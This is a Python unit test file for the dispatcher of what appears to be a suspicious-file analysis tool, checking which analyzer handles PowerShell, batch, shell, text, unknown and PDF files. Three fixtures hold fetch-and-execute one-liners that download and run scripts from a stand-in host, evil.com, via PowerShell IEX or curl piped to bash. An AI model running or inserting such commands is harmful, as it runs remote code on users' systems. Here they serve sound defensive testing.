"""
Unit tests for analysis/dispatcher.py.
"""

from analysis.dispatcher import dispatch
from analysis.model import FileInfo
from unittest.mock import patch


# --- dispatch test cases --------------------------------------------------------


def test_dispatch_to_script_ps1(tmp_path):
    f = tmp_path / "sample.ps1"
    f.write_text(
        "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/a.ps1')"
    )

    file_info = FileInfo(
        file_id=1,
        filename="sample.ps1",
        size=f.stat().st_size,
        channel="test",
        author="test",
        path=str(f),
    )

    with patch("analysis.dispatcher.magic.from_file", return_value="text/plain"):
        result = dispatch(file_info)

    assert result.analyzer == "script"


def test_dispatch_to_script_bat(tmp_path):
    f = tmp_path / "sample.bat"
    f.write_text(
        "powershell -Command \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/a.ps1')\""
    )

    file_info = FileInfo(
        file_id=1,
        filename="sample.bat",
        size=f.stat().st_size,
        channel="test",
        author="test",
        path=str(f),
    )

    with patch(
        "analysis.dispatcher.magic.from_file", return_value="text/x-msdos-batch"
    ):
        result = dispatch(file_info)

    assert result.analyzer == "script"


def test_dispatch_to_script_sh(tmp_path):
    f = tmp_path / "sample.sh"
    f.write_text("curl -s http://evil.com/a.sh | bash")

    file_info = FileInfo(
        file_id=1,
        filename="sample.sh",
        size=f.stat().st_size,
        channel="test",
        author="test",
        path=str(f),
    )

    with patch("analysis.dispatcher.magic.from_file", return_value="text/plain"):
        result = dispatch(file_info)

    assert result.analyzer == "script"


def test_dispatch_to_generic_unknown(tmp_path):
    f = tmp_path / "unknown_file.xyz"
    f.write_text("some content")

    file_info = FileInfo(
        file_id=1,
        filename="unknown_file.xyz",
        size=f.stat().st_size,
        channel="test",
        author="test",
        path=str(f),
    )

    with patch(
        "analysis.dispatcher.magic.from_file", return_value="application/octet-stream"
    ):
        result = dispatch(file_info)

    assert result.analyzer == "generic"


def test_dispatch_to_generic_txt(tmp_path):
    f = tmp_path / "sample.txt"
    f.write_text("This is a simple text file.")

    file_info = FileInfo(
        file_id=1,
        filename="sample.txt",
        size=f.stat().st_size,
        channel="test",
        author="test",
        path=str(f),
    )

    with patch("analysis.dispatcher.magic.from_file", return_value="text/plain"):
        result = dispatch(file_info)

    assert result.analyzer == "generic"


def test_dispatch_magic_failure():
    file_info = FileInfo(
        file_id=1,
        filename="sample.txt",
        size=123,
        channel="test",
        author="test",
        path="sample.txt",
    )

    with patch(
        "analysis.dispatcher.magic.from_file", side_effect=Exception("Magic error")
    ):
        result = dispatch(file_info)

    assert result.analyzer == "dispatcher"
    assert len(result.errors) > 0


def test_dispatch_to_pdf_fallback(tmp_path):
    f = tmp_path / "corrupted.pdf"
    f.write_text("1 0 obj\n<< /Type /Catalog >>\nendobj\n")

    file_info = FileInfo(
        file_id=1,
        filename="corrupted.pdf",
        size=f.stat().st_size,
        channel="test",
        author="test",
        path=str(f),
    )

    with patch("analysis.dispatcher.magic.from_file", return_value="text/plain"):
        result = dispatch(file_info)

    assert result.analyzer == "pdf"

    mismatches = [
        i for i in result.indicators if i.name == "extension_mimetype_mismatch"
    ]
    assert len(mismatches) == 1
    assert mismatches[0].context["detected_mime_type"] == "text/plain"
    assert mismatches[0].context["extension"] == ".pdf"
